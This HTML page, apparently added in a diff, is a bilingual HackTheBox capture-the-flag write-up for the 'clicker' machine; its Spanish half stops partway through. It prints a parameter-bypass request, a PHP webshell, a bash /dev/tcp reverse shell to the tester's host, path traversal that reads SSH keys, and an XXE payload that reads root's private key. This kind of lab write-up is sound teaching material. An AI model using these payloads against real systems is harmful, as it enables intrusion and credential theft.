@@ -1,0 +1,732 @@
+<!DOCTYPE html>
+<html lang="es" data-theme="light">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>clicker | Writeup</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&family=Inter:wght@400;600;800&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="../../index.css">
+</head>
+
+<body>
+    <nav class="top-nav">
+        <div class="container">
+            <div class="nav-content">
+                <div class="nav-left">
+                    <a href="../../index.html" class="back-link" title="Back to home">←</a>
+                    <h1 data-i18n="site-title">KDW_LABS</h1>
+                </div>
+                <div class="nav-controls">
+                    <button id="theme-toggle" class="icon-btn" aria-label="Toggle theme">
+                        <span class="theme-icon">🌙</span>
+                    </button>
+                    <button id="lang-toggle" class="icon-btn" aria-label="Toggle language">
+                        <span>EN</span>
+                    </button>
+                </div>
+            </div>
+        </div>
+    </nav>
+
+    <main class="container">
+        <header class="machine-header">
+            <h1 class="machine-title">clicker</h1>
+            <div class="machine-meta">
+                <span class="badge badge-platform">HTB</span>
+                <span class="badge badge-difficulty-medium">medium</span>
+            </div>
+        </header>
+
+        <article class="machine-content">
+            <div id="content-en" class="lang-content">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Exploitation Summary</h2>
+                    <p><strong>Exploitation process:</strong> The target machine exposed an NFS share containing a backup of a web application vulnerable to mass assignment. By exploiting a line feed injection bypass (<code>%0a</code>) in the role parameter, I escalated my privileges to admin within the application.</p>
+
+                    <p>Using admin access to the export functionality, I manipulated the nickname field to inject a PHP webshell into an exported file with a <code>.php</code> extension, achieving remote code execution as <code>www-data</code>. Privilege escalation to the user <code>jack</code> was accomplished by analyzing a SUID binary with Ghidra, discovering a path traversal vulnerability that allowed reading arbitrary files, including jack's SSH private key.</p>
+
+                    <p>Final privilege escalation to root exploited a sudo-allowed monitoring script with <code>SETENV</code> permissions. By manipulating the <code>HOME</code> environment variable and curl's configuration file, I proxied the script's HTTP request through Burp Suite and injected an XXE payload in the XML response, which was processed by the <code>xml_pp</code> binary, allowing me to read root's SSH private key.</p>
+
+                    <p><strong>Technologies/Exploits:</strong> NFS enumeration, line feed injection bypass, mass assignment vulnerability, PHP webshell injection, Ghidra binary analysis, SUID exploitation with path traversal, environment variable abuse (HOME, CURL_HOME), XXE (XML External Entity) injection.</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Initial Reconnaissance</h2>
+                <p>Starting with a comprehensive nmap scan to discover open ports and running services:</p>
+                <p><img src="./media/image12.png"
+                        alt="Nmap scan results showing multiple open ports including SSH on 22, HTTP on 80, RPC services on 111, and NFS on 2049" />
+                </p>
+
+                <p>The scan reveals several interesting services. Port 80 is running an Apache web server, and more importantly, I can see RPC services on port 111 and NFS on port 2049, which could provide access to shared network filesystems.</p>
+
+                <p>I add <code>clicker.htb</code> to my <code>/etc/hosts</code> file to resolve the domain properly.</p>
+
+                <h2>Web Application Enumeration</h2>
+                <p>I perform technology detection on the web application:</p>
+                <pre><code class="language-bash">whatweb http://clicker.htb</code></pre>
+
+                <p>The scan identifies Apache 2.4.52 running on Ubuntu, with PHP session cookies (<code>PHPSESSID</code>), Bootstrap framework, and HTML5. This gives me a good picture of the technology stack.</p>
+
+                <p>Exploring the web application, I discover several interesting routes:</p>
+                <p><img src="./media/image9.png"
+                        alt="Web application directory structure showing various PHP endpoints including login, register, play, save_game, and admin areas" />
+                </p>
+
+                <p>I notice that <code>export.php</code> and <code>admin.php</code> are not directly accessible, likely requiring authentication or specific privileges. This suggests a potential privilege escalation path within the application.</p>
+
+                <h2>NFS Share Discovery and Mounting</h2>
+                <p>Returning to the RPC and NFS services discovered earlier, I use <code>showmount</code> to enumerate available network shares:</p>
+                <pre><code class="language-bash">showmount -e 10.10.11.232</code></pre>
+
+                <p>The output reveals an accessible mount point:</p>
+                <pre><code class="language-plaintext">Export list for 10.10.11.232:
+/mnt/backups *</code></pre>
+
+                <p>This share is accessible to all clients (<code>*</code>), which is a significant misconfiguration. I create a local mount point and mount the remote NFS share:</p>
+                <pre><code class="language-bash">sudo mkdir -p /mnt/remote_nfs
+sudo mount -t nfs -o ro,vers=3 10.10.11.232:/mnt/backups /mnt/remote_nfs</code></pre>
+
+                <p>Examining the mounted share reveals a backup archive:</p>
+                <pre><code class="language-bash">ls -la /mnt/remote_nfs</code></pre>
+
+                <pre><code class="language-plaintext">total 2240
+drwxr-xr-x 2 nobody nogroup    4096 Sep  5  2023 .
+drwxr-xr-x 3 root   root       4096 Oct 24 22:32 ..
+-rw-r--r-- 1 root   root    2284115 Sep  1  2023 clicker.htb_backup.zip</code></pre>
+
+                <p>I copy the backup to my working directory for analysis:</p>
+                <pre><code class="language-bash">cp /mnt/remote_nfs/clicker.htb_backup.zip .</code></pre>
+
+                <h2>Source Code Analysis - Mass Assignment Vulnerability</h2>
+                <p>Extracting and examining the backup reveals the complete source code of the web application. In the <code>save_game.php</code> file, I discover a critical vulnerability:</p>
+                <p><img src="./media/image10.png"
+                        alt="PHP code from save_game.php showing a weak role check that only validates the role parameter if it doesn't contain 'admin'" />
+                </p>
+
+                <p>The code attempts to prevent malicious role modification with a simple check: if the <code>role</code> parameter contains the string "Admin", it's rejected. However, this check has a fatal flaw - it only examines the parameter value in a single line context.</p>
+
+                <p>The <code>save_profile</code> function saves all GET parameters directly to the database without proper validation. This is a classic mass assignment vulnerability where user-controlled input can modify unintended fields.</p>
+
+                <h3>Line Feed Injection Bypass</h3>
+                <p>The key insight is that the check uses <code>strpos()</code> to search for "Admin" in the role parameter, but doesn't account for line feed characters. By injecting a URL-encoded line feed (<code>%0a</code>) before the word "Admin", I can bypass this check:</p>
+                <pre><code class="language-http">GET /save_game.php?clicks=0&level=0&role%0a=Admin HTTP/1.1
+Host: clicker.htb</code></pre>
+
+                <p>The <code>strpos()</code> function doesn't find "Admin" in the first line, so the check passes. However, when the data is saved to the database, the full value including the line feed and "Admin" is stored, effectively elevating my role to administrator.</p>
+
+                <p>After sending this request, I can now access the admin panel at <code>/admin.php</code>:</p>
+                <p><img src="./media/image6.png"
+                        alt="Admin panel interface showing various administrative functions including user management and export options" />
+                </p>
+
+                <h2>Exploring Admin Functionality</h2>
+                <p>The admin panel reveals several functions, including a "Top Players" export feature. Examining the source code for this functionality:</p>
+                <p><img src="./media/image14.png"
+                        alt="PHP code showing SQL query construction in the export functionality with potential SQL injection point" />
+                </p>
+
+                <p>There appears to be a potential SQL injection vulnerability in the threshold parameter. However, there's an <code>is_numeric()</code> check protecting it:</p>
+                <p><img src="./media/image2.png"
+                        alt="PHP code showing is_numeric validation on the threshold parameter before SQL query execution" />
+                </p>
+
+                <p>I attempt various bypasses including hexadecimal values (inspired by <a href="https://www.pwntester.com/blog/2014/01/15/hackyou2014-web100-write-up/">this writeup</a>), but the protection appears to be effective. Additionally, modifying the threshold value via Burp Suite doesn't affect the server-side value, suggesting client-side hardcoding to 1000000.</p>
+
+                <h2>Webshell Injection via Export Functionality</h2>
+                <p>Shifting focus to the export functionality itself, I discover that files are saved to a predictable path:</p>
+                <p><img src="./media/image4.png"
+                        alt="Code showing the export path structure where files are saved in the exports directory" />
+                </p>
+
+                <p>More importantly, I can control the file extension through the POST request. This is a critical finding - if I can control both the content and the extension, I can inject a PHP webshell.</p>
+
+                <p>Testing the extension manipulation:</p>
+                <p><img src="./media/image7.png"
+                        alt="Burp Suite request showing manipulation of the file extension parameter in the export POST request" />
+                </p>
+
+                <p>The server accepts the modified extension and creates a file with it:</p>
+                <p><img src="./media/image3.png"
+                        alt="Server response confirming the creation of a file with the custom .php extension" />
+                </p>
+
+                <h3>Crafting the Attack</h3>
+                <p>The attack strategy is now clear:</p>
+                <ol>
+                    <li>Modify my user data to appear in the top 1000000 players (easy with high clicks value)</li>
+                    <li>Change my nickname to contain PHP code for a webshell</li>
+                    <li>Export the top players with a <code>.php</code> extension</li>
+                    <li>Access the exported file to execute the webshell</li>
+                </ol>
+
+                <p>Using the same mass assignment vulnerability from earlier, I update my nickname to a PHP webshell:</p>
+                <p><img src="./media/image13.png"
+                        alt="Request showing the injection of PHP webshell code into the nickname field using the mass assignment vulnerability" />
+                </p>
+
+                <p>The webshell payload is a simple command execution interface:</p>
+                <pre><code class="language-php">&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+
+                <p>After exporting the data as a PHP file, I can execute commands on the target system by accessing the exported file with a <code>cmd</code> parameter.</p>
+
+                <h2>Initial Access - www-data Shell</h2>
+                <p>Using the webshell, I establish a reverse shell connection. I set up a netcat listener:</p>
+                <pre><code class="language-bash">nc -lvnp 443</code></pre>
+
+                <p>Then execute a reverse shell payload through the webshell:</p>
+                <pre><code class="language-bash">bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1'</code></pre>
+
+                <p>I receive a connection as the <code>www-data</code> user and upgrade to a fully interactive shell.</p>
+
+                <h2>Post-Exploitation Enumeration</h2>
+                <p>Investigating the web application directory, I find database credentials in the configuration file:</p>
+                <pre><code class="language-php">$db_server="localhost";
+$db_username="clicker_db_user";
+$db_password="clicker_db_password";</code></pre>
+
+                <p>Connecting to MySQL and exploring the database, I find the admin user's password hash:</p>
+                <pre><code class="language-plaintext">ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82</code></pre>
+
+                <p>I attempt to crack this hash using hashcat with mode 1400 (SHA-256) and the rockyou wordlist, but the hash doesn't crack, suggesting a strong password or a custom salt mechanism.</p>
+
+                <p>Exploring <code>/home</code>, I discover a user named <code>jack</code>.</p>
+
+                <h2>Privilege Escalation to Jack - SUID Binary Analysis</h2>
+                <p>Searching for SUID binaries, I find an unusual one:</p>
+                <pre><code class="language-bash">find / -perm -4000 2>/dev/null</code></pre>
+
+                <p>The binary <code>/opt/manage/execute_query</code> stands out, owned by <code>jack</code> with the SUID bit set.</p>
+
+                <p>In the same directory, there's a README file explaining the binary's purpose:</p>
+                <pre><code class="language-plaintext">Web application Management
+
+Use the binary to execute the following task:
+ - 1: Creates the database structure and adds user admin
+ - 2: Creates fake players (better not tell anyone)
+ - 3: Resets the admin password
+ - 4: Deletes all users except the admin</code></pre>
+
+                <p>Running <code>strings</code> on the binary reveals references to SQL files, likely located in jack's home directory.</p>
+
+                <h3>Binary Analysis with Ghidra</h3>
+                <p>I transfer the binary to my local machine and analyze it with Ghidra, a reverse engineering tool. The decompiled code reveals a switch statement and the directory path for the queries:</p>
+                <p><img src="./media/image11.png"
+                        alt="Ghidra decompilation showing the switch statement and the queries directory path in jack's home" />
+                </p>
+
+                <p>Key findings from the analysis:</p>
+                <ul>
+                    <li>There's an undocumented option "0" that doesn't perform any useful action</li>
+                    <li>The default case is the most interesting - it accepts a second parameter</li>
+                    <li>This parameter can reference a file path relative to <code>/home/jack/queries/</code></li>
+                    <li>The path is limited to 20 bytes/characters</li>
+                    <li>Most importantly: there's a path traversal vulnerability</li>
+                </ul>
+
+                <h3>Exploiting the Path Traversal</h3>
+                <p>Testing the vulnerability, I can read arbitrary files by using directory traversal sequences:</p>
+                <pre><code class="language-bash">./execute_query 5 ../../../etc/passwd</code></pre>
+
+                <p>The binary attempts to execute the file content as an SQL query, and when it fails, it outputs the entire file content in the error message. This is a perfect information disclosure vector.</p>
+
+                <p>Targeting jack's SSH private key:</p>
+                <pre><code class="language-bash">./execute_query 5 ../.ssh/id_rsa</code></pre>
+
+                <p>Success! The binary outputs jack's private SSH key. I copy the key to my local machine, set the correct permissions:</p>
+                <pre><code class="language-bash">chmod 600 jack_id_rsa</code></pre>
+
+                <p>And connect via SSH:</p>
+                <pre><code class="language-bash">ssh -i jack_id_rsa jack@10.10.11.232</code></pre>
+
+                <p>I now have access as <code>jack</code> and can retrieve the user flag.</p>
+
+                <h2>Privilege Escalation to Root - Environment Variable Abuse</h2>
+                <p>Checking sudo permissions:</p>
+                <pre><code class="language-bash">sudo -l</code></pre>
+
+                <p>The output reveals interesting privileges:</p>
+                <pre><code class="language-plaintext">User jack may run the following commands on clicker:
+    (ALL : ALL) ALL
+    (root) SETENV: NOPASSWD: /opt/monitor.sh</code></pre>
+
+                <p>The <code>SETENV</code> tag is critical - it allows me to set arbitrary environment variables when running the script. Let's examine the script:</p>
+                <pre><code class="language-bash">#!/bin/bash
+if [ "$EUID" -ne 0 ]
+then echo "Error, please run as root"
+exit
+fi
+
+set PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
+unset PERL5LIB;
+unset PERLLIB;
+
+data=$(/usr/bin/curl -s http://clicker.htb/diagnostic.php?token=secret_diagnostic_token);
+/usr/bin/xml_pp <<< $data;
+if [[ $NOSAVE == "true" ]]; then
+    exit;
+else
+    timestamp=$(/usr/bin/date +%s)
+    /usr/bin/echo $data > /root/diagnostic_files/diagnostic_${timestamp}.xml
+fi</code></pre>
+
+                <p>The script attempts to secure itself by:</p>
+                <ul>
+                    <li>Hardcoding the PATH variable</li>
+                    <li>Unsetting dangerous Perl environment variables</li>
+                    <li>Using absolute paths for all binaries</li>
+                </ul>
+
+                <p>However, it overlooks several attack vectors.</p>
+
+                <h3>Understanding the Attack Chain</h3>
+                <p>The script fetches XML data from a web endpoint and processes it with <code>xml_pp</code>, an XML pretty-printer. The attack strategy involves:</p>
+                <ol>
+                    <li>Abuse the <code>HOME</code> environment variable (not blocked by the script)</li>
+                    <li>Create a malicious <code>.curlrc</code> configuration file in the controlled HOME directory</li>
+                    <li>Configure curl to proxy requests through Burp Suite</li>
+                    <li>Intercept and modify the XML response to inject an XXE payload</li>
+                    <li>Use XXE to read sensitive files like root's SSH key</li>
+                </ol>
+
+                <h3>Setting Up the Exploit</h3>
+                <p>First, I create a curl configuration file in jack's home directory:</p>
+                <pre><code class="language-bash">cat > /home/jack/.curlrc << EOF
+--proxy http://10.10.16.6:8080
+--show-error
+EOF</code></pre>
+
+                <p>This forces curl to route all requests through my Burp Suite instance running on port 8080.</p>
+
+                <p>I configure Burp Suite to listen on all interfaces instead of just localhost:</p>
+                <p><img src="./media/image1.png"
+                        alt="Burp Suite proxy settings configured to listen on all interfaces on port 8080" />
+                </p>
+
+                <p>Now I execute the monitoring script with the modified HOME environment variable:</p>
+                <pre><code class="language-bash">sudo HOME=/home/jack /opt/monitor.sh</code></pre>
+
+                <p>Burp Suite intercepts the request:</p>
+                <p><img src="./media/image5.png"
+                        alt="Burp Suite showing the intercepted HTTP request to the diagnostic endpoint" />
+                </p>
+
+                <h3>XXE Payload Injection</h3>
+                <p>I right-click in Burp Suite and enable response interception ("Intercept response to this request"). This allows me to modify the XML content being returned to the script.</p>
+
+                <p>When the response arrives, I replace it with an XXE payload:</p>
+                <p><img src="./media/image8.png"
+                        alt="Burp Suite showing the modified XML response containing the XXE payload" />
+                </p>
+
+                <p>The XXE payload:</p>
+                <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM "/etc/passwd"&gt;]&gt;
+&lt;file&gt;
+&amp;ent;
+&lt;/file&gt;</code></pre>
+
+                <p>This defines an external entity <code>ent</code> that reads <code>/etc/passwd</code>. When the XML parser processes <code>&amp;ent;</code>, it expands to the file contents.</p>
+
+                <p>Testing with <code>/etc/passwd</code> first:</p>
+                <pre><code class="language-bash">sudo HOME=/home/jack /opt/monitor.sh</code></pre>
+
+                <p>Output:</p>
+                <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE replace [
+&lt;!ENTITY ent SYSTEM "/etc/passwd"&gt;
+]&gt;
+&lt;file&gt;
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+(...)</code></pre>
+
+                <p>Perfect! The XXE exploitation works. Now I target root's SSH private key:</p>
+                <pre><code class="language-xml">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE replace [&lt;!ENTITY ent SYSTEM "/root/.ssh/id_rsa"&gt;]&gt;
+&lt;file&gt;
+&amp;ent;
+&lt;/file&gt;</code></pre>
+
+                <p>Executing the script again:</p>
+                <pre><code class="language-bash">sudo HOME=/home/jack /opt/monitor.sh</code></pre>
+
+                <p>Output:</p>
+                <pre><code class="language-plaintext">&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE replace [
+&lt;!ENTITY ent SYSTEM "/root/.ssh/id_rsa"&gt;
+]&gt;
+&lt;file&gt;
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQA
+(...)</code></pre>
+
+                <p>I copy root's private key, save it locally with correct permissions, and connect:</p>
+                <pre><code class="language-bash">chmod 600 root_id_rsa
+ssh -i root_id_rsa root@10.10.11.232</code></pre>
+
+                <p>I now have root access and can retrieve the root flag:</p>
+                <pre><code class="language-bash">root@clicker:~# cat /root/root.txt</code></pre>
+
+                <h2>Alternative Privilege Escalation Methods</h2>
+                <p>After completing the machine, I researched alternative solutions. The <code>SETENV</code> sudo permission can be exploited in multiple ways:</p>
+
+                <h3>LD_PRELOAD Method</h3>
+                <p>The <code>LD_PRELOAD</code> environment variable allows loading a shared library before any other libraries. By creating a malicious shared library that spawns a shell in an initialization function and setting <code>LD_PRELOAD</code> to point to it, you can achieve root code execution when any SUID binary is run.</p>
+
+                <h3>PERL5OPT Method</h3>
+                <p>The <code>PERL5OPT=-d</code> environment variable enables the Perl debugger. Although the script unsets <code>PERL5LIB</code> and <code>PERLLIB</code>, it doesn't unset <code>PERL5OPT</code>. If any Perl scripts are executed with elevated privileges (or if you can influence what gets executed), the debugger provides an interactive shell with those privileges.</p>
+
+                <p>Both methods demonstrate the danger of allowing environment variable manipulation in sudo configurations, even when other precautions like absolute paths and PATH hardcoding are in place.</p>
+            </div>
+
+            <div id="content-es" class="lang-content" style="display:none;">
+                <div class="machine-summary">
+                    <h2 data-i18n="summary-title">Resumen de Explotación</h2>
+                    <p><strong>Resumen del proceso:</strong> La máquina objetivo exponía un recurso compartido NFS que contenía una copia de seguridad de una aplicación web vulnerable a mass assignment. Explotando un bypass de inyección de salto de línea (<code>%0a</code>) en el parámetro de rol, escalé mis privilegios a administrador dentro de la aplicación.</p>
+
+                    <p>Utilizando el acceso de administrador a la funcionalidad de exportación, manipulé el campo de nickname para inyectar una webshell PHP en un archivo exportado con extensión <code>.php</code>, consiguiendo ejecución remota de código como <code>www-data</code>. La escalada de privilegios al usuario <code>jack</code> se logró analizando un binario SUID con Ghidra, descubriendo una vulnerabilidad de path traversal que permitía leer archivos arbitrarios, incluyendo la clave SSH privada de jack.</p>
+
+                    <p>La escalada de privilegios final a root explotó un script de monitorización permitido por sudo con permisos <code>SETENV</code>. Manipulando la variable de entorno <code>HOME</code> y el archivo de configuración de curl, proxifiqué la petición HTTP del script a través de Burp Suite e inyecté un payload XXE en la respuesta XML, que fue procesado por el binario <code>xml_pp</code>, permitiéndome leer la clave SSH privada de root.</p>
+
+                    <p><strong>Tecnologías/Exploits:</strong> Enumeración de NFS, bypass de inyección de salto de línea, vulnerabilidad de mass assignment, inyección de webshell PHP, análisis de binarios con Ghidra, explotación de SUID con path traversal, abuso de variables de entorno (HOME, CURL_HOME), inyección XXE (XML External Entity).</p>
+                </div>
+                <hr class="summary-divider">
+
+                <h2>Reconocimiento Inicial</h2>
+                <p>Comenzando con un escaneo completo de nmap para descubrir puertos abiertos y servicios en ejecución:</p>
+                <p><img src="./media/image12.png"
+                        alt="Resultados del escaneo nmap mostrando múltiples puertos abiertos incluyendo SSH en el 22, HTTP en el 80, servicios RPC en el 111 y NFS en el 2049" />
+                </p>
+
+                <p>El escaneo revela varios servicios interesantes. El puerto 80 ejecuta un servidor web Apache, y más importante aún, puedo ver servicios RPC en el puerto 111 y NFS en el puerto 2049, que podrían proporcionar acceso a sistemas de archivos de red compartidos.</p>
+
+                <p>Añado <code>clicker.htb</code> a mi archivo <code>/etc/hosts</code> para resolver el dominio correctamente.</p>
+
+                <h2>Enumeración de la Aplicación Web</h2>
+                <p>Realizo una detección de tecnologías en la aplicación web:</p>
+                <pre><code class="language-bash">whatweb http://clicker.htb</code></pre>
+
+                <p>El escaneo identifica Apache 2.4.52 ejecutándose en Ubuntu, con cookies de sesión PHP (<code>PHPSESSID</code>), framework Bootstrap y HTML5. Esto me da una imagen clara del stack tecnológico.</p>
+
+                <p>Explorando la aplicación web, descubro varias rutas interesantes:</p>
+                <p><img src="./media/image9.png"
+                        alt="Estructura de directorios de la aplicación web mostrando varios endpoints PHP incluyendo login, register, play, save_game y áreas de administración" />
+                </p>
+
+                <p>Observo que <code>export.php</code> y <code>admin.php</code> no son directamente accesibles, probablemente requiriendo autenticación o privilegios específicos. Esto sugiere una posible ruta de escalada de privilegios dentro de la aplicación.</p>
+
+                <h2>Descubrimiento y Montaje de Recurso Compartido NFS</h2>
+                <p>Volviendo a los servicios RPC y NFS descubiertos anteriormente, uso <code>showmount</code> para enumerar recursos compartidos de red disponibles:</p>
+                <pre><code class="language-bash">showmount -e 10.10.11.232</code></pre>
+
+                <p>La salida revela un punto de montaje accesible:</p>
+                <pre><code class="language-plaintext">Export list for 10.10.11.232:
+/mnt/backups *</code></pre>
+
+                <p>Este recurso es accesible para todos los clientes (<code>*</code>), lo cual es una mala configuración significativa. Creo un punto de montaje local y monto el recurso compartido NFS remoto:</p>
+                <pre><code class="language-bash">sudo mkdir -p /mnt/remote_nfs
+sudo mount -t nfs -o ro,vers=3 10.10.11.232:/mnt/backups /mnt/remote_nfs</code></pre>
+
+                <p>Examinando el recurso montado revela un archivo comprimido de backup:</p>
+                <pre><code class="language-bash">ls -la /mnt/remote_nfs</code></pre>
+
+                <pre><code class="language-plaintext">total 2240
+drwxr-xr-x 2 nobody nogroup    4096 Sep  5  2023 .
+drwxr-xr-x 3 root   root       4096 Oct 24 22:32 ..
+-rw-r--r-- 1 root   root    2284115 Sep  1  2023 clicker.htb_backup.zip</code></pre>
+
+                <p>Copio el backup a mi directorio de trabajo para analizarlo:</p>
+                <pre><code class="language-bash">cp /mnt/remote_nfs/clicker.htb_backup.zip .</code></pre>
+
+                <h2>Análisis del Código Fuente - Vulnerabilidad de Mass Assignment</h2>
+                <p>Extrayendo y examinando el backup revela el código fuente completo de la aplicación web. En el archivo <code>save_game.php</code>, descubro una vulnerabilidad crítica:</p>
+                <p><img src="./media/image10.png"
+                        alt="Código PHP de save_game.php mostrando una comprobación débil de rol que solo valida el parámetro role si no contiene 'admin'" />
+                </p>
+
+                <p>El código intenta prevenir la modificación maliciosa del rol con una simple comprobación: si el parámetro <code>role</code> contiene la cadena "Admin", se rechaza. Sin embargo, esta comprobación tiene un fallo fatal: solo examina el valor del parámetro en un contexto de línea única.</p>
+
+                <p>La función <code>save_profile</code> guarda todos los parámetros GET directamente en la base de datos sin validación adecuada. Esta es una vulnerabilidad clásica de mass assignment donde la entrada controlada por el usuario puede modificar campos no intencionados.</p>
+
+                <h3>Bypass de Inyección de Salto de Línea</h3>
+                <p>La clave está en que la comprobación usa <code>strpos()</code> para buscar "Admin" en el parámetro role, pero no tiene en cuenta los caracteres de salto de línea. Inyectando un salto de línea URL-encodeado (<code>%0a</code>) antes de la palabra "Admin", puedo hacer bypass de esta comprobación:</p>
+                <pre><code class="language-http">GET /save_game.php?clicks=0&level=0&role%0a=Admin HTTP/1.1
+Host: clicker.htb</code></pre>
+
+                <p>La función <code>strpos()</code> no encuentra "Admin" en la primera línea, así que la comprobación pasa. Sin embargo, cuando los datos se guardan en la base de datos, el valor completo incluyendo el salto de línea y "Admin" se almacena, elevando efectivamente mi rol a administrador.</p>
+
+                <p>Después de enviar esta petición, ahora puedo acceder al panel de administración en <code>/admin.php</code>:</p>
+                <p><img src="./media/image6.png"
+                        alt="Interfaz del panel de administración mostrando varias funciones administrativas incluyendo gestión de usuarios y opciones de exportación" />
+                </p>
+
+                <h2>Explorando la Funcionalidad de Administración</h2>
+                <p>El panel de administración revela varias funciones, incluyendo una característica de exportación de "Mejores Jugadores". Examinando el código fuente para esta funcionalidad:</p>
+                <p><img src="./media/image14.png"
+                        alt="Código PHP mostrando la construcción de consultas SQL en la funcionalidad de exportación con un punto potencial de inyección SQL" />
+                </p>
+
+                <p>Parece haber una potencial vulnerabilidad de inyección SQL en el parámetro threshold. Sin embargo, hay una comprobación <code>is_numeric()</code> protegiéndolo:</p>
+                <p><img src="./media/image2.png"
+                        alt="Código PHP mostrando la validación is_numeric en el parámetro threshold antes de la ejecución de la consulta SQL" />
+                </p>
+
+                <p>Intento varios bypasses incluyendo valores hexadecimales (inspirado por <a href="https://www.pwntester.com/blog/2014/01/15/hackyou2014-web100-write-up/">este writeup</a>), pero la protección parece ser efectiva. Además, modificar el valor threshold mediante Burp Suite no afecta al valor del lado del servidor, sugiriendo un hardcoding del lado del cliente a 1000000.</p>
+
+                <h2>Inyección de Webshell mediante Funcionalidad de Exportación</h2>
+                <p>Cambiando el enfoque a la funcionalidad de exportación en sí, descubro que los archivos se guardan en una ruta predecible:</p>
+                <p><img src="./media/image4.png"
+                        alt="Código mostrando la estructura de la ruta de exportación donde los archivos se guardan en el directorio exports" />
+                </p>
+
+                <p>Más importante aún, puedo controlar la extensión del archivo a través de la petición POST. Este es un hallazgo crítico: si puedo controlar tanto el contenido como la extensión, puedo inyectar una webshell PHP.</p>
+
+                <p>Probando la manipulación de extensión:</p>
+                <p><img src="./media/image7.png"
+                        alt="Petición de Burp Suite mostrando la manipulación del parámetro de extensión de archivo en la petición POST de exportación" />
+                </p>
+
+                <p>El servidor acepta la extensión modificada y crea un archivo con ella:</p>
+                <p><img src="./media/image3.png"
+                        alt="Respuesta del servidor confirmando la creación de un archivo con la extensión .php personalizada" />
+                </p>
+
+                <h3>Diseñando el Ataque</h3>
+                <p>La estrategia de ataque ahora es clara:</p>
+                <ol>
+                    <li>Modificar mis datos de usuario para aparecer en los mejores 1000000 jugadores (fácil con un valor alto de clicks)</li>
+                    <li>Cambiar mi nickname para que contenga código PHP de una webshell</li>
+                    <li>Exportar los mejores jugadores con extensión <code>.php</code></li>
+                    <li>Acceder al archivo exportado para ejecutar la webshell</li>
+                </ol>
+
+                <p>Usando la misma vulnerabilidad de mass assignment de antes, actualizo mi nickname a una webshell PHP:</p>
+                <p><img src="./media/image13.png"
+                        alt="Petición mostrando la inyección de código de webshell PHP en el campo nickname usando la vulnerabilidad de mass assignment" />
+                </p>
+
+                <p>El payload de la webshell es una interfaz simple de ejecución de comandos:</p>
+                <pre><code class="language-php">&lt;?php system($_GET['cmd']); ?&gt;</code></pre>
+
+                <p>Después de exportar los datos como un archivo PHP, puedo ejecutar comandos en el sistema objetivo accediendo al archivo exportado con un parámetro <code>cmd</code>.</p>
+
+                <h2>Acceso Inicial - Shell www-data</h2>
+                <p>Usando la webshell, establezco una conexión de reverse shell. Configuro un listener de netcat:</p>
+                <pre><code class="language-bash">nc -lvnp 443</code></pre>
+
+                <p>Luego ejecuto un payload de reverse shell a través de la webshell:</p>
+                <pre><code class="language-bash">bash -c 'bash -i >& /dev/tcp/10.10.16.6/443 0>&1'</code></pre>
+
+                <p>Recibo una conexión como el usuario <code>www-data</code> y actualizo a una shell completamente interactiva.</p>
+
+                <h2>Enumeración Post-Explotación</h2>
+                <p>Investigando el directorio de la aplicación web, encuentro credenciales de base de datos en el archivo de configuración:</p>
+                <pre><code class="language-php">$db_server="localhost";
+$db_username="clicker_db_user";
+$db_password="clicker_db_password";</code></pre>
+
+                <p>Conectándome a MySQL y explorando la base de datos, encuentro el hash de contraseña del usuario admin:</p>
+                <pre><code class="language-plaintext">ec9407f758dbed2ac510cac18f67056de100b1890f5bd8027ee496cc250e3f82</code></pre>
+
+                <p>Intento crackear este hash usando hashcat con modo 1400 (SHA-256) y el diccionario rockyou, pero el hash no se crackea, sugiriendo una contraseña fuerte o un mecanismo de salt personalizado.</p>
+
+                <p>Explorando <code>/home</code>, descubro un usuario llamado <code>jack</code>.</p>
+
+                <h2>Escalada de Privilegios a Jack - Análisis de Binario SUID</h2>
+                <p>Buscando binarios SUID, encuentro uno inusual:</p>
+                <pre><code class="language-bash">find / -perm -4000 2>/dev/null</code></pre>
+
+                <p>El binario <code>/opt/manage/execute_query</code> destaca, es propiedad de <code>jack</code> con el bit SUID establecido.</p>
+
+                <p>En el mismo directorio, hay un archivo README que explica el propósito del binario:</p>
+                <pre><code class="language-plaintext">Web application Management
+
+Use the binary to execute the following task:
+ - 1: Creates the database structure and adds user admin
+ - 2: Creates fake players (better not tell anyone)
+ - 3: Resets the admin password
+ - 4: Deletes all users except the admin</code></pre>
+
+                <p>Ejecutando <code>strings</code> en el binario revela referencias a archivos SQL, probablemente ubicados en el directorio home de jack.</p>
+
+                <h3>Análisis del Binario con Ghidra</h3>
+                <p>Transfiero el binario a mi máquina local y lo analizo con Ghidra, una herramienta de ingeniería inversa. El código descompilado revela una declaración switch y la ruta del directorio para las consultas:</p>
+                <p><img src="./media/image11.png"
+                        alt="Descompilación de Ghidra mostrando la declaración switch y la ruta del directorio de consultas en la home de jack" />
+                </p>
+
+                <p>Hallazgos clave del análisis:</p>
+                <ul>
+                    <li>Hay una opción no documentada "0" que no realiza ninguna acción útil</li>
+                    <li>El caso por defecto es el más interesante: acepta un segundo parámetro</li>
+                    <li>Este parámetro puede referenciar una ruta de archivo relativa a <code>/home/jack/queries/</code></li>
+                    <li>La ruta está limitada a 20 bytes/caracteres</li>
+                    <li>Lo más importante: hay una vulnerabilidad de path traversal</li>
+                </ul>
+
+                <h3>Explotando el Path Traversal</h3>
